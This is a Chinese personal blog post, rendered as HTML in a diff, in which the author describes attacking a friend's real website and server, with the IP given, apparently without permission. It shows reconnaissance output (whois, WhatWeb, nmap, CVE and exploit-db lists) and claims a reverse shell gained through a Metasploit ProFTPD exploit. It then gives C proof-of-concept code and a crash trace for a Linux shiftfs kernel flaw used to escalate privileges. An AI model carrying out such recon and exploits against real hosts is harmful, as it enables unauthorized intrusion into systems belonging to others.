@@ -1,0 +1,1010 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.29 with theme Tranquilpeak 0.4.1-BETA">
+    <title>对KIRA君的站点渗透尝试</title>
+    <meta name="author" content="FreeKnight.Wong">
+    <meta name="keywords" content="FreeKnight, duzhi5368, FreeKnight, Blog, duzhi5368">
+
+    <link rel="icon" href="https://duzhi5368.github.io/favicon.png">
+    
+
+    
+    <meta name="description" content="闲着无聊，拿Kira君的博客试试手.m(_ _)m
+
+最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。
+
+……万恶的内网。
+
+">
+    <meta property="og:description" content="闲着无聊，拿Kira君的博客试试手.m(_ _)m
+
+最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。
+
+……万恶的内网。
+
+">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="对KIRA君的站点渗透尝试">
+    <meta property="og:url" content="/2019/11/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95/">
+    <meta property="og:site_name" content="The lost island">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="The lost island">
+    <meta name="twitter:description" content="闲着无聊，拿Kira君的博客试试手.m(_ _)m
+
+最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。
+
+……万恶的内网。
+
+">
+    
+      <meta name="twitter:creator" content="@duzhi5368">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=640">
+    
+
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://duzhi5368.github.io/css/style-fpbzgxsy0kgmdvyrj5ykkg6ratccrk3gocmaqn4xpcjywmv5dteilzucro4f.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://duzhi5368.github.io/">The lost island</a>
+  </div>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://duzhi5368.github.io/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">FreeKnight.Wong</h4>
+        
+          <h5 class="sidebar-profile-bio">Ever tried, ever failed, fail better.</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/OLDPAGE/index.html">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">OldPage</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/duzhi5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.facebook.com/FreeKnight5368" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook-official"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.flickr.com/photos/158973746@N07" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-flickr"></i>
+      
+      <span class="sidebar-button-desc">Flickr</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://duzhi5368.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      对KIRA君的站点渗透尝试
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2019-11-22T00:00:00Z">
+        
+  十一月 22, 2019
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://duzhi5368.github.io/categories/%e7%a8%8b%e5%ba%8f">程序</a>, 
+    
+      <a class="category-link" href="https://duzhi5368.github.io/categories/2019">2019</a>
+    
+  
+
+
+  </div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>闲着无聊，拿Kira君的博客试试手.m(_ _)m</p>
+
+<p>最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。</p>
+
+<p>……万恶的内网。</p>
+
+<p></p>
+
+<p>用 <a href="http://whois.domaintools.com/">Whois</a> 扫描 BellSprite.com</p>
+
+<pre><code>Whois Record for BellSprite.com
+
+Domain Profile
+Registrant  Whois Agent
+Registrant Org  Domain Protection Services, Inc.
+Registrant Country  us
+Registrar   Name.com, Inc.
+IANA ID: 625
+URL: http://www.name.com
+Whois Server: whois.name.com
+
+(p)
+Registrar Status    clientTransferProhibited
+Dates   2,729 days old
+Created on 2012-05-31
+Expires on 2020-05-31
+Updated on 2018-11-21     
+Name Servers    NS1.DREAMHOST.COM (has 1,293,199 domains)
+NS2.DREAMHOST.COM (has 1,293,199 domains)
+NS3.DREAMHOST.COM (has 1,293,199 domains)
+  
+Tech Contact    Whois Agent
+Domain Protection Services, Inc.
+PO Box 1769,
+Denver, CO, 80201, us
+(p) (f)
+IP Address  【75.119.207.156 - 52 other sites hosted on this server】
+  
+IP Location United States - California - Brea - New Dream Network Llc
+ASN United States AS26347 DREAMHOST-AS - New Dream Network, LLC, US (registered Aug 28, 2002)
+Domain Status   Registered And Active Website
+IP History  6 changes on 6 unique IP addresses over 7 years   
+Registrar History   1 registrar   
+Hosting History 3 changes on 2 unique name servers over 7 years   
+ Website
+Website Title     认真你就输了 &amp;#8211; kira的网络日志    
+Server Type 【Apache】
+Response Code   200
+Terms   1,399 (Unique: 877, Linked: 394)
+Images  8 (Alt tags missing: 0)
+Links   139   (Internal: 121, Outbound: 16)
+</code></pre>
+
+<p>用 <a href="https://www.whatweb.net/">Whatweb</a> 扫描其网站 BellSprite.com</p>
+
+<pre><code>http://bellsprite.com [200 OK] Apache, Country[UNITED STATES][US],
+ HTML5, HTTPServer[Apache],
+ IP[75.119.207.156],
+ JQuery, MetaGenerator【WordPress 5.2.4】,
+ Script[text/javascript],
+ Title[认真你就输了 – kira的网络日志],
+ UncommonHeaders[link,upgrade]
+</code></pre>
+
+<p>用 <a href="https://pentest-tools.com/network-vulnerability-scanning/tcp-port-scanner-online-nmap#">在线Nmap</a> 扫描75.119.207.156这个IP</p>
+
+<pre><code>75.119.207.156
+apache2-heavy.caldera.dreamhost.com
+21  open    ftp     ProFTPD 1.2.10      
+22  open    ssh     OpenSSH             7.6p1 Ubuntu 4ubuntu0.3 Ubuntu Linux; protocol 2.0  
+80  open    http    Apache httpd            
+443 open    https   Apache httpd            
+587 open    smtp    Postfix smtpd
+</code></pre>
+
+<p>用 <a href="https://pentest-tools.com/network-vulnerability-scanning/network-security-scanner-online-openvas#">在线OpenVAS</a>  扫描75.119.207.156这个IP
+或者直接打开 <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-9520/product_id-16873/version_id-99603/Proftpd-Proftpd-1.2.10.html">CVE Details</a> 查找 （ProFTPD 1.2.10）</p>
+
+<pre><code>Vulnerabilities found for Proftpd 1.2.10 (port 21/tcp )
+Risk level(CVSS)    CVE Summary
+9   CVE-2011-4130   Use-after-free vulnerability in the Response API in ProFTPD before 1.3.3g allows remote authenticated users to execute arbitrary code via vectors involving an error that occurs after an FTP data transfer.
+7.1 CVE-2010-3867   Multiple directory traversal vulnerabilities in the mod_site_misc module in ProFTPD before 1.3.3c allow remote authenticated users to create directories, delete directories, create symlinks, and modify file timestamps via directory traversal sequences in a (1) SITE MKDIR, (2) SITE RMDIR, (3) SITE SYMLINK, or (4) SITE UTIME command.
+6.8 CVE-2010-4652   Heap-based buffer overflow in the sql_prepare_where function (contrib/mod_sql.c) in ProFTPD before 1.3.3d, when mod_sql is enabled, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted username containing substitution tags, which are not properly handled during construction of an SQL query.
+5   CVE-2011-1137   Integer overflow in the mod_sftp (aka SFTP) module in ProFTPD 1.3.3d and earlier allows remote attackers to cause a denial of service (memory consumption leading to OOM kill) via a malformed SSH message.
+4   CVE-2008-7265   The pr_data_xfer function in ProFTPD before 1.3.2rc3 allows remote authenticated users to cause a denial of service (CPU consumption) via an ABOR command during a data transfer.
+1.2 CVE-2012-6095   ProFTPD before 1.3.5rc1, when using the UserOwner directive, allows local users to modify the ownership of arbitrary files via a race condition and a symlink attack on the (1) MKD or (2) XMKD commands.
+ No vulnerabilities found for port 22
+ No vulnerabilities found for port 80 (missing version information)
+ No vulnerabilities found for port 443 (missing version information)
+ No vulnerabilities found for port 587 (missing version information)
+</code></pre>
+
+<p>在<a href="https://www.exploit-db.com/">exploit</a>搜索（Proftpd 1.2.10）发现它全系列有37个EXP，这里搜索（ProFTPD）</p>
+
+<pre><code>2015-06-10              ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)   Remote  Linux   Metasploit
+2015-04-21              ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution Remote  Linux   R-73eN
+2015-04-13              ProFTPd 1.3.5 - File Copy   Remote  Linux   anonymous
+2009-02-10              ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection    Remote  Multiple    AlpHaNiX
+2003-09-23              ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun DoS Linux   netris
+2002-12-09              ProFTPd 1.2.x - 'STAT' Denial of Service    DoS Linux   Rob klein Gunnewiek
+2001-03-15              WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glob Expansion    Remote  Linux   Frank DENIS
+2000-12-20              ProFTPd 1.2 - 'SIZE' Remote Denial of Service   DoS Linux   JeT-Li
+1999-09-17              ProFTPd 1.2 pre6 - 'snprintf' Remote Root   Remote  Linux   Tymm Twillman
+1999-08-27              ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)   Remote  Linux   anonymous
+1999-08-17              ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)   Remote  Linux   babcia padlina ltd
+1999-02-09              WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (2)    Remote  Linux   jamez &amp; c0nd0r
+1999-02-09              WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buffer Overflow (1)    Remote  Linux   smiler &amp; cossack
+2011-12-01              FreeBSD - 'ftpd / ProFTPd' Remote Command Execution Remote  FreeBSD kingcope
+2010-12-03              ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)    Remote  Linux   Metasploit
+2010-12-02              ProFTPd 1.3.2 rc3 &lt; 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)  Remote  Linux   Metasploit
+2011-01-09              ProFTPd 1.2 &lt; 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)    Remote  Linux   Metasploit
+2011-01-09              ProFTPd 1.3.2 rc3 &lt; 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)    Remote  Linux   Metasploit
+2011-02-07              ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)   DoS Linux   kingcope
+2010-12-02              ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution  Remote  Linux   anonymous
+2010-11-07              ProFTPd IAC 1.3.x - Remote Command Execution    Remote  Linux   kingcope
+2009-10-12              ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow Local   Unix    Michael Domberg
+2009-02-10              ProFTPd - 'mod_mysql' Authentication Bypass Remote  Multiple    gat3way
+2007-08-24              ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow  Remote  Linux   netris
+2007-04-13              ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow   Local   Linux   Xpl017Elz
+2007-02-19              ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)  Local   Linux   Revenge
+2007-02-18              ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)  Local   Linux   Revenge
+2003-10-15              ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2) Remote  Linux   Solar Eclipse
+2006-12-13              ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)  DoS Linux   Core Security
+2006-11-27              ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)   Remote  Linux   Evgeny Legerov
+2004-10-17              ProFTPd 1.2.10 - Remote Users Enumeration   Remote  Linux   Leon Juranic
+2004-08-13              ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow   Local   Linux   pi3
+2001-01-12              ProFTPd 1.2.0 pre10 - Remote Denial of Service  DoS Linux   JeT-Li
+2001-01-03              ProFTPd 1.2.0 rc2 - Memory Leakage  DoS Linux   Piotr Zurawski
+2003-10-13              ProFTPd 1.2.7 &lt; 1.2.9rc2 - Remote Code Execution / Brute Force  Remote  Linux   Haggis
+2003-10-04              ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1) Remote  Linux   bkbll
+2003-06-19              ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection Remote  Linux   Spaine
+</code></pre>
+
+<p>在其中我选择了一个<a href="https://www.exploit-db.com/exploits/16852">Metasploit的EXP</a>，顺利获得反弹payload，连接成功。</p>
+
+<p>但此时发现自己不是管理员权限，所以需要进行提权。</p>
+
+<pre><code>uname -a
+
+获取服务器版本 Ubuntu 18.04 LTS
+</code></pre>
+
+<p>然后检查它的<a href="https://www.cvedetails.com/version/236205/Canonical-Ubuntu-Linux-18.04.html">CVE</a>，我的天，一堆红色10分。</p>
+
+<p>因为自己之前是C++软件开发，比较擅长的是缓冲区溢出，于是顺手找了一个2019年CVE 2019-15791 进行了分析。</p>
+
+<p>这个CVE核心出现在 mnt/shiftfs 文件中 shiftfs_btrfs_ioctl_fd_replace() 的一个问题。</p>
+
+<p>shiftfs.c的部分伪代码如下：</p>
+
+<pre><code>    function shiftfs_btrfs_ioctl_fd_replace(){
+        /* ... */
+        src = fdget(oldfd);
+        if (!src.file)
+          return -EINVAL;
+        ret = shiftfs_real_fdget(src.file, lfd);
+        /* ... */
+    }
+    
+    static int shiftfs_real_fdget(const struct file *file, struct fd *lowerfd)
+    {
+        struct shiftfs_file_info *file_info = file-&gt;private_data;
+        struct file *realfile = file_info-&gt;realfile;
+        /* ... */
+    }
+</code></pre>
+
+<p>这个问题细节是shiftfs_btrfs_ioctl_fd_replace()函数调用了fdget()函数，然后将传回的数据直接传给shiftfs_real_fdget()函数，并做了非安全的隐式类型强转为shiftfs_file_info*。</p>
+
+<p>但不同的文件系统下，file-&gt;private_data的值类型是不同的，但都会被强制转换为 shiftfs_file_info* ，这显然有一些问题，于是根据别人的经验，做了0x10的偏移，得到了下面的结构realfile，再做0x10偏移得到了vma结构的vmacache_seqnum，通过修改该值，引发了一个发生在0x4242处的内存应用释放错误。</p>
+
+<p>于是伪造参数调用</p>
+
+<pre><code>    int main(void) {
+      // 制造无效内存，目的是让vma校验 vmacache_seqnum 看起来是0x4242
+      for (int i=0; i&lt;0x4242; i++) {
+        void *x = mmap((void*)0x100000000UL, 0x1000, PROT_READ,
+            MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
+        if (x == MAP_FAILED) err(1, &quot;mmap vmacache seqnum&quot;);
+        munmap(x, 0x1000);
+      }
+    
+      int root = open(&quot;mnt/shiftfs&quot;, O_RDONLY);
+      if (root == -1) err(1, &quot;open shiftfs root&quot;);
+      int foofd = open(&quot;/proc/self/environ&quot;, O_RDONLY);
+      if (foofd == -1) err(1, &quot;open foofd&quot;);
+      // 调用
+      struct btrfs_ioctl_vol_args iocarg = {
+        .fd = foofd
+      };
+      ioctl(root, BTRFS_IOC_SNAP_CREATE, &amp;iocarg);
+    }
+</code></pre>
+
+<p>成功</p>
+
+<pre><code>BUG: unable to handle page fault for address: 0000000000004289
+Call Trace:
+ shiftfs_ioctl+0x65/0x76 [shiftfs]
+ do_vfs_ioctl+0x407/0x670
+ ? putname+0x4a/0x50
+ ksys_ioctl+0x67/0x90
+ __x64_sys_ioctl+0x1a/0x20
+ do_syscall_64+0x5a/0x130
+ entry_SYSCALL_64_after_hwframe+0x44/0xa9
+</code></pre>
+
+<p>然后制作meterpreter成功连接目标机器了，但发现这只是个跳板机……</p>
+
+<p>接下来内网渗透想不到怎么办，先GG这里了。。。</p>
+
+<p>学艺不精，时间不够，蛋疼~should try harder.</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://duzhi5368.github.io/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201911/" data-tooltip="月记201911">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0google-hacking%E6%8A%80%E6%9C%AF/" data-tooltip="读书笔记《Google Hacking技术》">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/11/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread"></div>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2019 <a href="https://duzhi5368.github.io">FreeKnight</a>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201911/" data-tooltip="月记201911">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://duzhi5368.github.io/2019/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0google-hacking%E6%8A%80%E6%9C%AF/" data-tooltip="读书笔记《Google Hacking技术》">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://duzhi5368.github.io/?=https://duzhi5368.github.io/2019/11/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95/">
+              <i class="fa fa-home"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://duzhi5368.github.io/?=https%3A%2F%2Fduzhi5368.github.io%2F2019%2F11%2F%25E5%25AF%25B9kira%25E5%2590%259B%25E7%259A%2584%25E7%25AB%2599%25E7%2582%25B9%25E6%25B8%2597%25E9%2580%258F%25E5%25B0%259D%25E8%25AF%2595%2F">
+          <i class="fa fa-home"></i><span>分享到 Homepage</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/323d61e9279c83a8fbccc01acf01f1e2?s=110" alt="作者的图片" />
+    
+    <h4 id="about-card-name">FreeKnight.Wong</h4>
+    
+      <div id="about-card-bio">Ever tried, ever failed, fail better.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Game software engineer
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Makati
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/12/%E6%9C%88%E8%AE%B0201911/">
+                <h3 class="media-heading">月记201911</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><ul>
+<li>产品思维</li>
+<li>黑客技术
+
+<ul>
+<li>OSCP</li>
+</ul></li>
+<li>赚钱</li>
+<li>Gap Year</li>
+<li>《论工业社会极其未来》</li>
+<li>打工</li>
+</ul>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E5%AF%B9kira%E5%90%9B%E7%9A%84%E7%AB%99%E7%82%B9%E6%B8%97%E9%80%8F%E5%B0%9D%E8%AF%95/">
+                <h3 class="media-heading">对KIRA君的站点渗透尝试</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>闲着无聊，拿Kira君的博客试试手.m(_ _)m</p>
+
+<p>最终失败了，主要原因是内网渗透不熟，先这样吧……公司这环境也不足够我做更多尝试了。</p>
+
+<p>……万恶的内网。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0google-hacking%E6%8A%80%E6%9C%AF/">
+                <h3 class="media-heading">读书笔记《Google Hacking技术》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这是一份人人都该去了解的最基础的HACK技术，它几乎没有编程需求，只有基本的互联网操作，值得去学习一下。</p>
+
+<p>利用信息的不对称一直是商业活动的核心要素之一。而当前我们在一个信息时代，如何利用搜索引擎获取信息，汇总信息，筛选信息则是重中之重。</p>
+
+<p>如果能够加上英语基础，扩大自己的视野，配以一个有创意灵活的脑子，就一定会在这个时代占据生存的有利环境。</p>
+
+<p>某志总结依然是“英语是基础，互联网是手段，脑子是个好东西，有这三样，金钱总会来的。”</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/11/%E5%8D%8A%E6%9C%88%E8%AE%B020191018_20191031/">
+                <h3 class="media-heading">半月记20191018_20191031</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>这半个月主要研究黑客的一些东西吧，其他变化不大，看了一些电影，哈哈~</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://duzhi5368.github.io/2019/10/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%B2%BE%E9%80%9Ametasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                <h3 class="media-heading">读书笔记《精通Metasploit渗透测试》</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>本想简单记录一点的，一不小心就记录多了。</p>
